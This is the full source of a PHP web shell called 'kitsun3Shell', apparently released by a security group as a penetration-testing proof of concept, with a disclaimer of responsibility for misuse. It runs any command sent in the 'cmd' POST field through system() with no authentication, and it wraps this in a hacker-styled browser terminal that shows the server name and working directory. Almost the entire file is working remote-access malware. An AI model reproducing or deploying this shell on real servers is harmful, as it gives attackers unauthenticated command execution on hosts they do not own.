<?php
/*
* kitsun3Shell.php v.1.0 pre-release build
* FML - Free Malware License
* © Kitsun3Sec Security Research group
* DISCLAIMER: This web shell was created to be used as PoC by penetration Testers
* DISCLAIMER: We are not responsible for the misuse of the shell
*/

function post_request() {
    $command = $_POST['cmd'];
    $teste = system($command);
    return "<div id='response'>".$teste."</div>";
}
function main() {
    if(isset($_POST['cmd'])) {
        $resp = post_request();
        echo $resp;
       return;
    }
}

main();
?>

<DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Kitsun3Shell</title>
        <style>
            body {
                background-color: black;
                color: #ff6666;
                font-weight: bold;
            }

            span {
                color: 	#8cff66;
            }

            #path {
                color: #66b3ff;
            }

            button {
                display: none;
            }

            input {
                background-color: black;
                border: 0px;
                color: green;
                font-weight: bolder;
                outline: none;
            }
        </style>

        <script>

            function makerequest(url, command){
                var xhr = new XMLHttpRequest();
                xhr.open("POST", 'http://localhost:1337/kitsun3Shell.php', true);

                // Envia a informação do cabeçalho junto com a requisição.
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function() { // Chama a função quando o estado mudar.
                    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
                        var output = xhr.responseText.split("id='response'>")[0].split("<div")[0];
                        var element = document.getElementById('output');
                        var pmpt = xhr.responseText.split('id="prompt">')[2].split("</div>")[0];
                        element.innerHTML = '<pre>' + element.innerHTML + pmpt + command + '\n' + output + '</pre>';
                    }
                }
                xhr.send("cmd="+command);
            }

            function execComand(command) {
                var command = command;
                var url = window.location.href;
                console.log(url);

                makerequest(url, command);
            }


            window.onload = function() {
                myInput = document.getElementById("myInput");
                myInput.focus()
                myInput.addEventListener("keyup", function(event) {
                    event.preventDefault();
                    if (event.keyCode === 13) {
                        if (myInput.value == 'clear'){
                            location.reload();
                            return;
                        }
                        execComand(myInput.value);
                        document.getElementById('myInput').value = '';
                    }
                });
            }
        </script>
    </head>

    <!-- Terminal Appareance -->
    <body>
        <div id="terminal">
            <pre id="shell-content">
                <div id="logo">
       _ _                   _____ __ _          _ _
  /\ /(_) |_ ___ _   _ _ __ |___ // _\ |__   ___| | |
 / //_/ | __/ __| | | | '_ \  |_ \\ \| '_ \ / _ \ | |
/ __ \| | |_\__ \ |_| | | | |___) |\ \ | | |  __/ | |
\/  \/|_|\__|___/\__,_|_| |_|____/\__/_| |_|\___|_|_|

                </div>

            </pre>
        <div id='output'></div>

            <?php
                echo '<div id="prompt"><span>kitsun3@</span>'. $_SERVER['SERVER_NAME'].':$'. '<span id="path">'.getcwd().' $ '.'</span></div>';
            ?>
            <input type="text" name="cmd" id="myInput">
        </div>
    </body>
</html>


